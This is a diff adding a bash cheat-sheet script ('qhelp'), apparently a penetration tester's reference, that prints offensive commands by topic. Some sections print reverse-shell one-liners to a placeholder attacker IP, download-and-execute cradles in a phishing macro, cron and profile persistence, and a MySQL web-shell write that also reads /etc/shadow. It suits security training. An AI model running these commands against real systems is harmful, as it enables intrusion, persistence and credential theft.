@@ -1,0 +1,577 @@
+#!/bin/bash
+
+BOLD='\033[1m'
+RED='\033[31m'
+GREEN='\033[32m'
+BLUE='\033[34m'
+YELLOW='\033[33m'
+CYAN='\033[36m'
+NC='\033[0m'
+
+CONFIG="$HOME/.servepaths"
+NOTES_DIR=""
+
+# Load notes dir from config
+if [ -f "$CONFIG" ]; then
+    source "$CONFIG"
+    NOTES_DIR="${NOTES_DIR:-}"
+fi
+
+# Fallback common paths
+if [ -z "$NOTES_DIR" ]; then
+    for p in \
+        "$HOME/Notes" \
+        "$HOME/notes" \
+        "$HOME/Desktop/Notes" \
+        "/opt/notes"
+    do
+        [ -d "$p/CheatSheets" ] && NOTES_DIR="$p" && break
+    done
+fi
+
+CS="$NOTES_DIR/CheatSheets"
+
+ref() {
+    local file="$1"
+    local section="$2"
+    local toolkit="$3"
+    echo -e "  ${BLUE}→ CheatSheets/$file${NC}"
+    [ -n "$section" ] && echo -e "    Section: ${GREEN}$section${NC}"
+    [ -n "$toolkit" ] && echo -e "    Script:  ${CYAN}$toolkit${NC}"
+}
+
+show_all() {
+    echo ""
+    echo -e "${BOLD}${YELLOW}╔══════════════════════════════════════╗${NC}"
+    echo -e "${BOLD}${YELLOW}║            QUICK HELP                ║${NC}"
+    echo -e "${BOLD}${YELLOW}╚══════════════════════════════════════╝${NC}"
+    echo ""
+    echo -e "${BOLD}Usage: qhelp <topic>${NC}"
+    echo ""
+    echo -e "${YELLOW}── Shell ──────────────────────────────────${NC}"
+    echo -e "  ${GREEN}qhelp shell${NC}        stable shell / PTY upgrade"
+    echo ""
+    echo -e "${YELLOW}── Recon & Enum ───────────────────────────${NC}"
+    echo -e "  ${GREEN}qhelp nmap${NC}         port scanning"
+    echo -e "  ${GREEN}qhelp smb${NC}          SMB enumeration"
+    echo -e "  ${GREEN}qhelp ldap${NC}         LDAP enumeration"
+    echo -e "  ${GREEN}qhelp dns${NC}          DNS enumeration"
+    echo -e "  ${GREEN}qhelp snmp${NC}         SNMP enumeration"
+    echo -e "  ${GREEN}qhelp web${NC}          web recon (gobuster/ffuf/nikto)"
+    echo ""
+    echo -e "${YELLOW}── Credentials ────────────────────────────${NC}"
+    echo -e "  ${GREEN}qhelp mimikatz${NC}     mimikatz commands"
+    echo -e "  ${GREEN}qhelp lsass${NC}        LSASS dumping"
+    echo -e "  ${GREEN}qhelp sam${NC}          SAM extraction"
+    echo -e "  ${GREEN}qhelp laps${NC}         LAPS + GPP passwords"
+    echo -e "  ${GREEN}qhelp hash${NC}         hash cracking reference"
+    echo -e "  ${GREEN}qhelp crack${NC}        hash cracking reference"
+    echo ""
+    echo -e "${YELLOW}── Active Directory ───────────────────────${NC}"
+    echo -e "  ${GREEN}qhelp bloodhound${NC}   BloodHound collection"
+    echo -e "  ${GREEN}qhelp kerberoast${NC}   Kerberoasting"
+    echo -e "  ${GREEN}qhelp asrep${NC}        AS-REP Roasting"
+    echo -e "  ${GREEN}qhelp dacl${NC}         DACL abuse"
+    echo -e "  ${GREEN}qhelp delegation${NC}   constrained/unconstrained delegation"
+    echo -e "  ${GREEN}qhelp dcsync${NC}       DCSync"
+    echo -e "  ${GREEN}qhelp golden${NC}       Golden/Silver ticket"
+    echo -e "  ${GREEN}qhelp relay${NC}        NTLM relay"
+    echo -e "  ${GREEN}qhelp adcs${NC}         ADCS / ESC attacks"
+    echo -e "  ${GREEN}qhelp rbcd${NC}         Resource-based constrained delegation"
+    echo ""
+    echo -e "${YELLOW}── Lateral Movement ───────────────────────${NC}"
+    echo -e "  ${GREEN}qhelp pth${NC}          Pass-the-Hash"
+    echo -e "  ${GREEN}qhelp winrm${NC}        evil-winrm"
+    echo -e "  ${GREEN}qhelp wmi${NC}          WMI / DCOM"
+    echo -e "  ${GREEN}qhelp spray${NC}        password spraying"
+    echo ""
+    echo -e "${YELLOW}── Pivoting ───────────────────────────────${NC}"
+    echo -e "  ${GREEN}qhelp ligolo${NC}       ligolo-ng tunnel"
+    echo -e "  ${GREEN}qhelp chisel${NC}       chisel tunnel"
+    echo -e "  ${GREEN}qhelp ssh${NC}          SSH tunneling"
+    echo ""
+    echo -e "${YELLOW}── Privilege Escalation ───────────────────${NC}"
+    echo -e "  ${GREEN}qhelp privesc${NC}      privesc overview"
+    echo -e "  ${GREEN}qhelp potato${NC}       potato attacks"
+    echo -e "  ${GREEN}qhelp suid${NC}         SUID/GTFOBins"
+    echo -e "  ${GREEN}qhelp sudo${NC}         sudo abuse"
+    echo ""
+    echo -e "${YELLOW}── Payload & Evasion ──────────────────────${NC}"
+    echo -e "  ${GREEN}qhelp msfvenom${NC}     msfvenom payload gen"
+    echo -e "  ${GREEN}qhelp amsi${NC}         AMSI bypass"
+    echo -e "  ${GREEN}qhelp applocker${NC}    AppLocker bypass"
+    echo -e "  ${GREEN}qhelp injection${NC}    process injection"
+    echo ""
+    echo -e "${YELLOW}── MSSQL ──────────────────────────────────${NC}"
+    echo -e "  ${GREEN}qhelp mssql${NC}        MSSQL attacks"
+    echo ""
+    echo -e "${YELLOW}── Services ───────────────────────────────${NC}"
+    echo -e "  ${GREEN}qhelp ftp${NC}          FTP"
+    echo -e "  ${GREEN}qhelp rdp${NC}          RDP / xfreerdp"
+    echo -e "  ${GREEN}qhelp mysql${NC}        MySQL"
+    echo -e "  ${GREEN}qhelp kerberos${NC}     Kerberos port 88"
+    echo ""
+    echo -e "${YELLOW}── File Transfer ──────────────────────────${NC}"
+    echo -e "  ${GREEN}qhelp transfer${NC}     file transfer methods"
+    echo ""
+    echo -e "${YELLOW}── Persistence ────────────────────────────${NC}"
+    echo -e "  ${GREEN}qhelp persist${NC}      persistence techniques"
+    echo ""
+    echo -e "${YELLOW}── Payload & Evasion (extra) ──────────────${NC}"
+    echo -e "  ${GREEN}qhelp hoaxshell${NC}    hoaxshell PS reverse shell"
+    echo -e "  ${GREEN}qhelp phishing${NC}     phishing / initial access"
+    echo ""
+    echo -e "${YELLOW}── C2 ─────────────────────────────────────${NC}"
+    echo -e "  ${GREEN}qhelp c2${NC}           C2 frameworks intro"
+    echo -e "  ${GREEN}qhelp msf${NC}          Metasploit reference"
+    echo ""
+    echo -e "${YELLOW}=================================${NC}"
+}
+
+TOPIC_DIR="$(dirname "$(realpath "$0")")/qhelp.d"
+
+# Normalize aliases to canonical topic name
+normalize_topic() {
+    case "$1" in
+        upgrade|tty|pty|stable)          echo "shell" ;;
+        portscan|scan)                    echo "nmap" ;;
+        smbclient|netexec|nxc)           echo "smb" ;;
+        ldapdomaindump)                  echo "ldap" ;;
+        dnsrecon|dnsenum)                echo "dns" ;;
+        onesixtyone|snmpwalk)            echo "snmp" ;;
+        gobuster|ffuf|nikto|dirbuster)   echo "web" ;;
+        procdump|lsassy)                 echo "lsass" ;;
+        secretsdump)                     echo "sam" ;;
+        gpp)                             echo "laps" ;;
+        hashcat|john)                    echo "hash" ;;
+        crack)                           echo "crack" ;;
+        sharphound)                      echo "bloodhound" ;;
+        kerberoasting|spn)               echo "kerberoast" ;;
+        asreproast)                      echo "asrep" ;;
+        acl|genericall|genericwrite)     echo "dacl" ;;
+        ntds)                            echo "dcsync" ;;
+        silver|ticket|krbtgt)            echo "golden" ;;
+        ntlmrelay|responder)             echo "relay" ;;
+        esc|certipy|certify)             echo "adcs" ;;
+        passthehash)                     echo "pth" ;;
+        evilwinrm)                       echo "winrm" ;;
+        dcom|wmiexec)                    echo "wmi" ;;
+        password|spraying)               echo "spray" ;;
+        tunnel|pivot)                    echo "ligolo" ;;
+        sshtunnel|sshuttle)              echo "ssh" ;;
+        pe)                              echo "privesc" ;;
+        juicy|printspoofer|godpotato)    echo "potato" ;;
+        gtfobins|capabilities|caps)      echo "suid" ;;
+        payload|genpayload)              echo "msfvenom" ;;
+        bypass|evasion|av)               echo "amsi" ;;
+        clm|installutil)                 echo "applocker" ;;
+        process|hollowing|dll)           echo "injection" ;;
+        sql|xpcmdshell)                  echo "mssql" ;;
+        xfreerdp|rdesktop)               echo "rdp" ;;
+        kerbrute)                        echo "kerberos" ;;
+        *)                               echo "$1" ;;
+    esac
+}
+
+show_ref() {
+    local topic
+    topic=$(normalize_topic "$1")
+
+    # Source topic file from qhelp.d if it exists
+    if [ -f "$TOPIC_DIR/$topic" ]; then
+        source "$TOPIC_DIR/$topic"
+        if [ -n "$NOTES_DIR" ]; then
+            echo -e "  ${YELLOW}Notes dir: $NOTES_DIR${NC}"
+        fi
+        echo ""
+        return
+    fi
+
+    echo ""
+    case "$topic" in
+        shell|upgrade|tty|pty|stable)
+            echo -e "${BOLD}${CYAN}Shell Upgrade / Stable Shell${NC}"
+            echo -e "\n  ${YELLOW}[Linux — PTY upgrade]${NC}"
+            echo "  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
+            echo "  # then Ctrl+Z"
+            echo "  stty raw -echo; fg"
+            echo "  export TERM=xterm"
+            echo ""
+            echo -e "  ${YELLOW}[Windows — ConPtyShell]${NC}"
+            echo "  # Kali:"
+            echo "  stty raw -echo; (stty size; cat) | rlwrap nc -lvnp <PORT>"
+            echo "  # Victim:"
+            echo "  powershell iex (New-Object Net.WebClient).DownloadString('http://<IP>/conptyshell.ps1')"
+            echo "  Invoke-ConPtyShell <KALI_IP> <PORT>"
+            echo ""
+            echo -e "  ${YELLOW}[socat — full TTY]${NC}"
+            echo "  # Kali:"
+            echo "  socat file:\`tty\`,raw,echo=0 tcp-listen:<PORT>"
+            echo "  # Victim:"
+            echo "  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<KALI_IP>:<PORT>"
+            echo ""
+            echo -e "  ${BLUE}→ General/04_Shell Upgrade & Payload Delivery.md${NC}"
+            ;;
+        nmap|portscan|scan)
+            echo -e "${BOLD}${CYAN}Nmap / Port Scanning${NC}"
+            ref "01_Recon_Enumeration.md" "Port Scanning — Nmap" "aunmap"
+            ;;
+        smb|smbclient|netexec|nxc)
+            echo -e "${BOLD}${CYAN}SMB Enumeration${NC}"
+            ref "01_Recon_Enumeration.md" "SMB Enumeration" "smbenum"
+            ref "09_Windows_Lateral_Movement.md" "Pass-The-Hash with nxc"
+            ;;
+        ldap|ldapdomaindump)
+            echo -e "${BOLD}${CYAN}LDAP Enumeration${NC}"
+            ref "01_Recon_Enumeration.md" "LDAP Enumeration" "adenum"
+            ;;
+        dns|dnsrecon|dnsenum)
+            echo -e "${BOLD}${CYAN}DNS Enumeration${NC}"
+            ref "01_Recon_Enumeration.md" "DNS Enumeration"
+            ;;
+        snmp|onesixtyone|snmpwalk)
+            echo -e "${BOLD}${CYAN}SNMP Enumeration${NC}"
+            ref "01_Recon_Enumeration.md" "SNMP Enumeration"
+            ;;
+        web|gobuster|ffuf|nikto|dirbuster)
+            echo -e "${BOLD}${CYAN}Web Recon${NC}"
+            ref "01_Recon_Enumeration.md" "Web Recon"
+            ;;
+        mimikatz)
+            echo -e "${BOLD}${CYAN}Mimikatz${NC}"
+            ref "08_Windows_Credentials.md" "Mimikatz"
+            ;;
+        lsass|procdump|lsassy)
+            echo -e "${BOLD}${CYAN}LSASS Dumping${NC}"
+            ref "08_Windows_Credentials.md" "LSASS Dumping Methods"
+            ;;
+        sam|secretsdump)
+            echo -e "${BOLD}${CYAN}SAM Extraction${NC}"
+            ref "08_Windows_Credentials.md" "SAM Database Extraction"
+            ;;
+        laps|gpp)
+            echo -e "${BOLD}${CYAN}LAPS + GPP Passwords${NC}"
+            ref "08_Windows_Credentials.md" "LAPS" "lapsread"
+            ref "08_Windows_Credentials.md" "GPP Password" "lapsread"
+            ;;
+        hash|crack|hashcat|john)
+            echo -e "${BOLD}${CYAN}Hash Cracking${NC}"
+            ref "18_Hash_Cracking.md" "Hash Identification" "crack"
+            ref "18_Hash_Cracking.md" "Hashcat — All Key Modes" "crack"
+            ref "18_Hash_Cracking.md" "John the Ripper"
+            ;;
+        bloodhound|sharphound)
+            echo -e "${BOLD}${CYAN}BloodHound${NC}"
+            ref "13_Active_Directory.md" "BloodHound" "adenum"
+            ;;
+        kerberoast|kerberoasting|spn)
+            echo -e "${BOLD}${CYAN}Kerberoasting${NC}"
+            ref "13_Active_Directory.md" "Kerberoasting" "adenum"
+            ref "18_Hash_Cracking.md" "Kerberoasting (TGS-REP)" "crack"
+            ;;
+        asrep|asreproast)
+            echo -e "${BOLD}${CYAN}AS-REP Roasting${NC}"
+            ref "13_Active_Directory.md" "AS-REP Roasting" "adenum"
+            ref "18_Hash_Cracking.md" "AS-REP Roasting" "crack"
+            ;;
+        dacl|acl|genericall|genericwrite)
+            echo -e "${BOLD}${CYAN}DACL Abuse${NC}"
+            ref "13_Active_Directory.md" "DACL Abuse"
+            ;;
+        delegation|constrained|unconstrained|s4u|rbcd)
+            echo -e "${BOLD}${CYAN}Delegation Attacks${NC}"
+            ref "13_Active_Directory.md" "Unconstrained Delegation + Printer Bug"
+            ref "13_Active_Directory.md" "Constrained Delegation (S4U2Self + S4U2Proxy)"
+            ref "13_Active_Directory.md" "RBCD (Resource-Based Constrained Delegation)"
+            ;;
+        dcsync|ntds|secretsdump)
+            echo -e "${BOLD}${CYAN}DCSync${NC}"
+            ref "13_Active_Directory.md" "DCSync" "dcsync"
+            ;;
+        golden|silver|ticket|krbtgt)
+            echo -e "${BOLD}${CYAN}Golden / Silver Ticket${NC}"
+            ref "13_Active_Directory.md" "Golden Ticket"
+            ref "13_Active_Directory.md" "Silver Ticket"
+            ;;
+        relay|ntlmrelay|responder)
+            echo -e "${BOLD}${CYAN}NTLM Relay${NC}"
+            ref "13_Active_Directory.md" "NTLM Relay (Responder + ntlmrelayx)"
+            ref "14_ADCS_Attacks.md" "ESC8 — NTLM Relay to ADCS HTTP Enrollment" "adcsenum"
+            ;;
+        adcs|esc|certipy|certify)
+            echo -e "${BOLD}${CYAN}ADCS Attacks${NC}"
+            ref "14_ADCS_Attacks.md" "ESC1–ESC16 Full Reference Table" "adcsenum"
+            ref "14_ADCS_Attacks.md" "ESC1 — Misconfigured Template" "adcsenum"
+            ref "14_ADCS_Attacks.md" "ESC8 — NTLM Relay to ADCS HTTP Enrollment" "adcsenum"
+            ;;
+        pth|passthehash)
+            echo -e "${BOLD}${CYAN}Pass-the-Hash${NC}"
+            ref "09_Windows_Lateral_Movement.md" "Pass-The-Hash with nxc" "spray"
+            ;;
+        winrm|evilwinrm)
+            echo -e "${BOLD}${CYAN}evil-winrm${NC}"
+            ref "09_Windows_Lateral_Movement.md" "evil-winrm"
+            ;;
+        wmi|dcom|wmiexec)
+            echo -e "${BOLD}${CYAN}WMI / DCOM${NC}"
+            ref "09_Windows_Lateral_Movement.md" "WMI / DCOM"
+            ;;
+        spray|password|spraying)
+            echo -e "${BOLD}${CYAN}Password Spraying${NC}"
+            ref "09_Windows_Lateral_Movement.md" "Password Spraying" "spray"
+            ;;
+        ligolo|tunnel|pivot)
+            echo -e "${BOLD}${CYAN}Ligolo-ng Tunnel${NC}"
+            ref "07_Network_Pivoting.md" "Ligolo-ng" "ligolo"
+            ;;
+        chisel)
+            echo -e "${BOLD}${CYAN}Chisel Tunnel${NC}"
+            ref "07_Network_Pivoting.md" "Chisel"
+            echo -e "  ${YELLOW}Kali:   chisel server -p 8080 --reverse${NC}"
+            echo -e "  ${YELLOW}Victim: chisel client <kali>:8080 R:socks${NC}"
+            ;;
+        ssh|sshtunnel|sshuttle)
+            echo -e "${BOLD}${CYAN}SSH Tunneling${NC}"
+            ref "07_Network_Pivoting.md" "SSH Tunneling (All 4 Modes)"
+            ref "07_Network_Pivoting.md" "sshuttle"
+            ;;
+        privesc|pe)
+            echo -e "${BOLD}${CYAN}Privilege Escalation${NC}"
+            ref "15_Privilege_Escalation.md" "Windows PrivEsc"
+            ref "15_Privilege_Escalation.md" "Linux PrivEsc"
+            ref "10_Linux_PostExploit.md" "Automated Tools"
+            ;;
+        potato|juicy|printspoofer|godpotato)
+            echo -e "${BOLD}${CYAN}Potato Attacks${NC}"
+            ref "15_Privilege_Escalation.md" "Token Impersonation"
+            ref "15_Privilege_Escalation.md" "Hot Potato / Potato Family"
+            ref "08_Windows_Credentials.md" "SeImpersonatePrivilege / Potato Attacks"
+            ;;
+        suid|gtfobins|capabilities|caps)
+            echo -e "${BOLD}${CYAN}SUID / GTFOBins${NC}"
+            ref "10_Linux_PostExploit.md" "Common SUID Abuses"
+            ref "10_Linux_PostExploit.md" "Capabilities"
+            ref "15_Privilege_Escalation.md" "SUID / SGID Binaries"
+            ;;
+        sudo)
+            echo -e "${BOLD}${CYAN}Sudo Abuse${NC}"
+            ref "15_Privilege_Escalation.md" "sudo -l Abuse"
+            ;;
+        msfvenom|payload|genpayload)
+            echo -e "${BOLD}${CYAN}Msfvenom / Payload Generation${NC}"
+            ref "03_Shellcode_Runners.md" "Shellcode Generation Reference" "genpayload"
+            ref "04_Process_Injection.md" "Meterpreter Listener" "msfshell"
+            ;;
+        amsi|bypass|evasion|av)
+            echo -e "${BOLD}${CYAN}AMSI Bypass / AV Evasion${NC}"
+            ref "05_AV_AMSI_Evasion.md" "AMSI Bypass Techniques"
+            ref "05_AV_AMSI_Evasion.md" "Shellcode Encryption"
+            ref "17_Rust_AV_Bypass.md" "Full Working Shellcode Runner"
+            ;;
+        applocker|clm|constrained|installutil)
+            echo -e "${BOLD}${CYAN}AppLocker / CLM Bypass${NC}"
+            ref "06_AppLocker_CLM_Bypass.md" "Check AppLocker Status"
+            ref "06_AppLocker_CLM_Bypass.md" "InstallUtil (.NET Uninstall Bypass)"
+            ref "06_AppLocker_CLM_Bypass.md" "PowerShell CLM Bypass — Custom Runspace"
+            ;;
+        injection|process|hollowing|dll)
+            echo -e "${BOLD}${CYAN}Process Injection${NC}"
+            ref "04_Process_Injection.md" "Classic Remote Shellcode Injection"
+            ref "04_Process_Injection.md" "DLL Injection"
+            ref "04_Process_Injection.md" "Process Hollowing"
+            ;;
+        mssql|sql|xpcmdshell)
+            echo -e "${BOLD}${CYAN}MSSQL Attacks${NC}"
+            ref "12_MSSQL_Attacks.md" "xp_cmdshell — OS Command Execution"
+            ref "12_MSSQL_Attacks.md" "Linked Server Traversal"
+            ref "12_MSSQL_Attacks.md" "EXECUTE AS LOGIN — Impersonation Privesc"
+            ;;
+        ftp)
+            echo -e "${BOLD}${CYAN}FTP${NC}"
+            echo -e "  ${YELLOW}[Connect]${NC}"
+            echo "  ftp <IP>"
+            echo "  anonymous:anonymous"
+            echo "  passive"
+            echo "  get <file> / mget *"
+            echo -e "  ${BLUE}→ General/02_Services.md — 21 - FTP${NC}"
+            ;;
+        rdp|xfreerdp|rdesktop)
+            echo -e "${BOLD}${CYAN}RDP${NC}"
+            echo "  xfreerdp /u:<user> /p:<pass> /v:<IP>"
+            echo "  xfreerdp /u:<user> /pth:<HASH> /v:<IP>"
+            echo "  xfreerdp /u:<user> /p:<pass> /v:<IP> /drive:share,/home/kali/share"
+            echo "  rdesktop -u <user> -p <pass> <IP>"
+            echo -e "  ${BLUE}→ General/13_Remote Desktop & Access.md${NC}"
+            ;;
+        mysql)
+            echo -e "${BOLD}${CYAN}MySQL${NC}"
+            echo "  mysql -h <IP> -u root"
+            echo "  mysql -h <IP> -u root -p"
+            echo "  select load_file('/etc/shadow');"
+            echo "  select '<?php system(\$_GET[\"cmd\"]);?>' INTO OUTFILE '/var/www/html/shell.php';"
+            echo -e "  ${BLUE}→ General/02_Services.md — 3306 - MySQL${NC}"
+            ;;
+        kerberos|kerbrute)
+            echo -e "${BOLD}${CYAN}Kerberos (port 88)${NC}"
+            echo "  kerbrute userenum -d <DOMAIN> users.txt --dc <DC_IP>"
+            echo "  kerbrute passwordspray -d <DOMAIN> users.txt 'Password123' --dc <DC_IP>"
+            echo "  nxc smb <DC> -u users.txt -p 'Pass' --continue-on-success"
+            echo -e "  ${BLUE}→ General/02_Services.md — 88 - Kerberos${NC}"
+            ;;
+        transfer|filetransfer|download|upload)
+            echo -e "${BOLD}${CYAN}File Transfer${NC}"
+            echo -e "  ${YELLOW}[Windows download]${NC}"
+            echo "  iwr http://<IP>/file -OutFile C:\\Temp\\file"
+            echo "  certutil -urlcache -split -f http://<IP>/file C:\\Temp\\file"
+            echo "  bitsadmin /transfer job http://<IP>/file C:\\out"
+            echo ""
+            echo -e "  ${YELLOW}[Linux download]${NC}"
+            echo "  wget http://<IP>/file -O /tmp/file"
+            echo "  curl http://<IP>/file -o /tmp/file"
+            echo ""
+            echo -e "  ${YELLOW}[SMB]${NC}"
+            echo "  impacket-smbserver share \$(pwd) -smb2support"
+            echo "  copy \\\\<KALI_IP>\\share\\file C:\\Temp\\"
+            echo ""
+            echo -e "  ${YELLOW}[Netcat]${NC}"
+            echo "  # Kali: nc -lp 5151 < file"
+            echo "  # Victim: nc <IP> 5151 > file"
+            echo -e "  ${BLUE}→ General/12_File Transfer.md${NC}"
+            echo -e "  Script: ${CYAN}loot${NC} (generate transfer commands)"
+            ;;
+        persist|persistence)
+            echo -e "${BOLD}${CYAN}Persistence${NC}"
+            echo -e "  ${YELLOW}[Linux]${NC}"
+            echo '  echo "bash -i >& /dev/tcp/<IP>/4444 0>&1" >> ~/.bash_profile'
+            echo "  echo '* * * * * bash -i >& /dev/tcp/<IP>/4444 0>&1' | crontab -"
+            echo "  echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys"
+            echo ""
+            echo -e "  ${YELLOW}[Windows — Registry]${NC}"
+            echo "  reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /t REG_SZ /d C:\\shell.exe"
+            echo ""
+            echo -e "  ${YELLOW}[Windows — Scheduled Task]${NC}"
+            echo "  schtasks /create /tn updater /tr C:\\shell.exe /sc onlogon /ru SYSTEM"
+            echo -e "  ${BLUE}→ General/15_Persistence.md${NC}"
+            ;;
+        hoaxshell|hoax)
+            echo -e "${BOLD}${CYAN}Hoaxshell — Obfuscated PS Reverse Shell${NC}"
+            echo -e "  ${YELLOW}[Install]${NC}"
+            echo "  git clone https://github.com/t3l3machus/hoaxshell"
+            echo "  pip3 install -r requirements.txt"
+            echo ""
+            echo -e "  ${YELLOW}[HTTP]${NC}"
+            echo "  python3 hoaxshell.py -s <KALI_IP>"
+            echo ""
+            echo -e "  ${YELLOW}[HTTPS self-signed]${NC}"
+            echo "  python3 hoaxshell.py -s <KALI_IP> -c"
+            echo ""
+            echo -e "  ${YELLOW}[Custom port]${NC}"
+            echo "  python3 hoaxshell.py -s <KALI_IP> -p 8080"
+            echo ""
+            echo -e "  Output: PS one-liner → run on victim"
+            echo -e "  Bypasses: AMSI + AV via obfuscation"
+            ;;
+        phishing|initial|macro|vba|hta)
+            echo -e "${BOLD}${CYAN}Phishing / Initial Access${NC}"
+            echo -e "  ${YELLOW}[VBA Macro]${NC}"
+            echo "  Shell \"powershell -w hidden IEX(New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1')\""
+            echo ""
+            echo -e "  ${YELLOW}[HTA]${NC}"
+            echo "  mshta http://<IP>/payload.hta"
+            echo ""
+            echo -e "  ${YELLOW}[ICS Calendar]${NC}"
+            echo "  sendEmail -s <SMTP_IP> -t victim@corp -f attacker@corp -u 'Meeting' -a iCalendar.ics"
+            echo ""
+            echo -e "  ${YELLOW}[Jscript]${NC}"
+            echo "  MSXML2.XMLHTTP + ADODB.Stream → download + exec"
+            echo -e "  ${BLUE}→ CheatSheets/02_Initial_Access_Phishing.md${NC}"
+            echo -e "  ${BLUE}→ General/03_Initial Access & Phishing.md${NC}"
+            ;;
+        c2|c2framework|covenant|havoc|sliver|cobalt)
+            echo -e "${BOLD}${CYAN}C2 Frameworks — Intro${NC}"
+            echo ""
+            echo -e "  ${YELLOW}[What is C2?]${NC}"
+            echo "  Command & Control — persistent comms channel between attacker and implant"
+            echo "  Implant runs on victim → checks in to C2 server → receives tasks"
+            echo ""
+            echo -e "  ${YELLOW}[Popular frameworks]${NC}"
+            printf "  %-15s %s\n" "Metasploit"  "built-in, easiest, well-known (AV flags it)"
+            printf "  %-15s %s\n" "Havoc"       "modern, evasive, free — github.com/HavocFramework/Havoc"
+            printf "  %-15s %s\n" "Sliver"      "open-source, Go-based — github.com/BishopFox/sliver"
+            printf "  %-15s %s\n" "Covenant"    ".NET-based, C# implants — github.com/cobbr/Covenant"
+            printf "  %-15s %s\n" "Cobalt Strike" "industry standard, paid (\$3500/yr)"
+            echo ""
+            echo -e "  ${YELLOW}[Basic C2 concepts]${NC}"
+            printf "  %-15s %s\n" "Listener"    "server waiting for implant connections"
+            printf "  %-15s %s\n" "Implant"     "payload running on victim (beacon/agent/stager)"
+            printf "  %-15s %s\n" "Sleep"       "check-in interval (longer = stealthier)"
+            printf "  %-15s %s\n" "Jitter"      "randomize sleep interval to avoid detection"
+            printf "  %-15s %s\n" "Staging"     "small stager downloads full implant"
+            printf "  %-15s %s\n" "Stageless"   "full implant in one payload"
+            echo ""
+            echo -e "  ${YELLOW}[Havoc quickstart]${NC}"
+            echo "  # Server:"
+            echo "  ./havoc server --profile ./profiles/havoc.yaotl"
+            echo "  # Client:"
+            echo "  ./havoc client"
+            echo "  # Generate implant: Payloads → Windows Shellcode/EXE"
+            echo ""
+            echo -e "  ${YELLOW}[Sliver quickstart]${NC}"
+            echo "  sliver-server"
+            echo "  sliver > generate --mtls <KALI_IP> --os windows --save /tmp/implant.exe"
+            echo "  sliver > mtls --lport 8888"
+            echo "  sliver > sessions"
+            ;;
+        msf|metasploit|msfconsole)
+            echo -e "${BOLD}${CYAN}Metasploit Reference${NC}"
+            echo -e "  ${YELLOW}[Basics]${NC}"
+            echo "  use <module>"
+            echo "  set RHOSTS <IP>"
+            echo "  set PAYLOAD windows/x64/meterpreter/reverse_tcp"
+            echo "  show options"
+            echo "  exploit / run"
+            echo ""
+            echo -e "  ${YELLOW}[Sessions]${NC}"
+            echo "  sessions -l          # list"
+            echo "  sessions -i <ID>     # interact"
+            echo "  sessions -u <ID>     # upgrade to meterpreter"
+            echo "  sessions -K          # kill all"
+            echo ""
+            echo -e "  ${YELLOW}[Meterpreter]${NC}"
+            echo "  getsystem"
+            echo "  hashdump"
+            echo "  migrate <PID>"
+            echo "  load incognito; list_tokens -u; impersonate_token 'DOMAIN\\user'"
+            echo "  run post/windows/gather/smart_hashdump"
+            echo "  run post/multi/recon/local_exploit_suggester"
+            echo ""
+            echo -e "  ${YELLOW}[Pivoting]${NC}"
+            echo "  run autoroute -s 10.10.10.0/24"
+            echo "  use auxiliary/server/socks_proxy; set SRVPORT 1080; run"
+            echo "  portfwd add -l 3389 -p 3389 -r <INTERNAL_IP>"
+            echo -e "  ${BLUE}→ General/19_Metasploit.md${NC}"
+            echo -e "  Script: ${CYAN}msfshell${NC} (auto handler)"
+            ;;
+        *)
+            echo -e "${RED}Unknown topic: $topic${NC}"
+            echo -e "${BLUE}Run 'qhelp' to see all topics${NC}"
+            exit 1
+            ;;
+    esac
+
+    # Show file path if notes dir configured
+    if [ -n "$NOTES_DIR" ]; then
+        echo ""
+        echo -e "  ${YELLOW}Notes dir: $NOTES_DIR${NC}"
+    else
+        echo ""
+        echo -e "  ${YELLOW}Tip: set NOTES_DIR=/path/to/notes in ~/.servepaths${NC}"
+    fi
+    echo ""
+}
+
+if [ "$#" -eq 0 ]; then
+    show_all
+else
+    show_ref "$1"
+fi
